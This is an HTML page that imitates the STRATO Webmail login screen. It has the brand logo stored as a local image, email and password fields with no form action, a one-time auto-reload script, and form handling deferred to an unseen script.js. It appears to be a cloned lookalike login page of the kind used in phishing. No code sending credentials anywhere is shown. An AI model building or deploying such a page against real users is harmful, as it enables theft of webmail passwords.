<!DOCTYPE html>
<html lang="de-DE">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login - STRATO Webmail</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="styles.css">
  <link rel="icon" href="images/favicon.ico" type="image/x-icon">

  <script>
      window.onload = function() {
    if (!sessionStorage.getItem('reloaded')) {
        sessionStorage.setItem('reloaded', 'true');
        setTimeout(() => location.reload(), 2000);
    }
};
</script>

</head>
<body>

  <!-- ===== Header ===== -->
  <header class="site-header">
    <a class="logo" href="#" aria-label="STRATO home">
      
      <span class="logo-text"><img style="height: 26px; width: 125px;" src="images/strato-seeklogo.png"/></span>
    </a>

    <nav class="header-nav" aria-label="Header">
      <a class="nav-item" href="#">
        <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-question-circle-fill" viewBox="0 0 16 16">
  <path xmlns="http://www.w3.org/2000/svg" d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0M5.496 6.033h.825c.138 0 .248-.113.266-.25.09-.656.54-1.134 1.342-1.134.686 0 1.314.343 1.314 1.168 0 .635-.374.927-.965 1.371-.673.489-1.206 1.06-1.168 1.987l.003.217a.25.25 0 0 0 .25.246h.811a.25.25 0 0 0 .25-.25v-.105c0-.718.273-.927 1.01-1.486.609-.463 1.244-.977 1.244-2.056 0-1.511-1.276-2.241-2.673-2.241-1.267 0-2.655.59-2.75 2.286a.237.237 0 0 0 .241.247m2.325 6.443c.61 0 1.029-.394 1.029-.927 0-.552-.42-.94-1.029-.94-.584 0-1.009.388-1.009.94 0 .533.425.927 1.01.927z"></path>
</svg>
        <span>Hilfe &amp; Kontakt</span>
      </a>

      <div class="nav-lang-wrap">
        <button class="nav-item nav-lang" id="langToggle" type="button" aria-haspopup="true" aria-expanded="false">
          <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-globe" viewBox="0 0 16 16">
  <path xmlns="http://www.w3.org/2000/svg" d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8m7.5-6.923c-.67.204-1.335.82-1.887 1.855A8 8 0 0 0 5.145 4H7.5zM4.09 4a9.3 9.3 0 0 1 .64-1.539 7 7 0 0 1 .597-.933A7.03 7.03 0 0 0 2.255 4zm-.582 3.5c.03-.877.138-1.718.312-2.5H1.674a7 7 0 0 0-.656 2.5zM4.847 5a12.5 12.5 0 0 0-.338 2.5H7.5V5zM8.5 5v2.5h2.99a12.5 12.5 0 0 0-.337-2.5zM4.51 8.5a12.5 12.5 0 0 0 .337 2.5H7.5V8.5zm3.99 0V11h2.653c.187-.765.306-1.608.338-2.5zM5.145 12q.208.58.468 1.068c.552 1.035 1.218 1.65 1.887 1.855V12zm.182 2.472a7 7 0 0 1-.597-.933A9.3 9.3 0 0 1 4.09 12H2.255a7 7 0 0 0 3.072 2.472M3.82 11a13.7 13.7 0 0 1-.312-2.5h-2.49c.062.89.291 1.733.656 2.5zm6.853 3.472A7 7 0 0 0 13.745 12H11.91a9.3 9.3 0 0 1-.64 1.539 7 7 0 0 1-.597.933M8.5 12v2.923c.67-.204 1.335-.82 1.887-1.855q.26-.487.468-1.068zm3.68-1h2.146c.365-.767.594-1.61.656-2.5h-2.49a13.7 13.7 0 0 1-.312 2.5m2.802-3.5a7 7 0 0 0-.656-2.5H12.18c.174.782.282 1.623.312 2.5zM11.27 2.461c.247.464.462.98.64 1.539h1.835a7 7 0 0 0-3.072-2.472c.218.284.418.598.597.933M10.855 4a8 8 0 0 0-.468-1.068C9.835 1.897 9.17 1.282 8.5 1.077V4z"></path>
</svg>
          <span id="langLabel">Deutsch</span>
          <svg viewBox="0 0 24 24" class="chevron" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
            <path d="M6 9l6 6 6-6"/>
          </svg>
        </button>
        <ul class="lang-menu" id="langMenu" hidden>
          <li><button type="button" data-lang="English (UK)">English (UK)</button></li>
          <li><button type="button" data-lang="English (US)">English (US)</button></li>
          <li><button type="button" data-lang="Deutsch">Deutsch</button></li>
          <li><button type="button" data-lang="Español">Español</button></li>
        </ul>
      </div>

      <a class="nav-item" href="#">
        <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-person-fill" viewBox="0 0 16 16">
  <path xmlns="http://www.w3.org/2000/svg" d="M3 14s-1 0-1-1 1-4 6-4 6 3 6 4-1 1-1 1zm5-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6"></path>
</svg>
        <span>Kunden-Login</span>
      </a>
    </nav>
  </header>

  <!-- ===== Login panel ===== -->
  <main class="login-main">
    <section class="login-panel" aria-labelledby="loginTitle">
      <p class="brand-line">STRATO Webmail</p>
      <h1 class="login-title" id="loginTitle">LOGIN</h1>

      <form id="loginForm" novalidate>
        <label class="field" for="email">
          <svg aria-hidden="true" width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-envelope-fill" viewBox="0 0 16 16">
  <path xmlns="http://www.w3.org/2000/svg" d="M.05 3.555A2 2 0 0 1 2 2h12a2 2 0 0 1 1.95 1.555L8 8.414zM0 4.697v7.104l5.803-3.558zM6.761 8.83l-6.57 4.027A2 2 0 0 0 2 14h12a2 2 0 0 0 1.808-1.144l-6.57-4.027L8 9.586zm3.436-.586L16 11.801V4.697z"></path>
</svg>
          <input id="email" name="email" type="email" placeholder="E-Mail-Adresse" autocomplete="username">
        </label>

        <label class="field" for="password">
          <svg aria-hidden="true" width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-lock-fill" viewBox="0 0 16 16">
  <path xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" d="M8 0a4 4 0 0 1 4 4v2.05a2.5 2.5 0 0 1 2 2.45v5a2.5 2.5 0 0 1-2.5 2.5h-7A2.5 2.5 0 0 1 2 13.5v-5a2.5 2.5 0 0 1 2-2.45V4a4 4 0 0 1 4-4m0 1a3 3 0 0 0-3 3v2h6V4a3 3 0 0 0-3-3"></path>
</svg>
          <input id="password" name="password" type="password" placeholder="Passwort" autocomplete="current-password">
        </label>

        <a class="forgot" href="#">Passwort vergessen</a>

        <label class="stay" for="stay">
          <input type="checkbox" id="stay" checked>
          <span class="box" aria-hidden="true">
            <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3.4" stroke-linecap="round" stroke-linejoin="round">
              <path d="M4.5 12.5l5 5 10-11"/>
            </svg>
          </span>
          <span class="stay-text">Angemeldet bleiben</span>
        </label>

        <button type="submit" class="signin" id="btn">Anmelden</button>

        <p class="demo-note" id="demoNote" role="status" hidden></p>
      </form>
    </section>
  </main>

  <!-- ===== Footer ===== -->
  <footer class="site-footer">
    <nav class="footer-links" aria-label="Footer">
      <a href="#">STRATO.de</a>

      <a href="#">Datenschutz</a>
      <span class="sep" aria-hidden="true"></span>
      <a href="#">Impressum</a>
    </nav>

      <span>© 2026 Open-Xchange GmbH</span>
      <span>Version: 8.46.7</span>
    </div>
  </footer>

  <script src="script.js"></script>
</body>
</html>
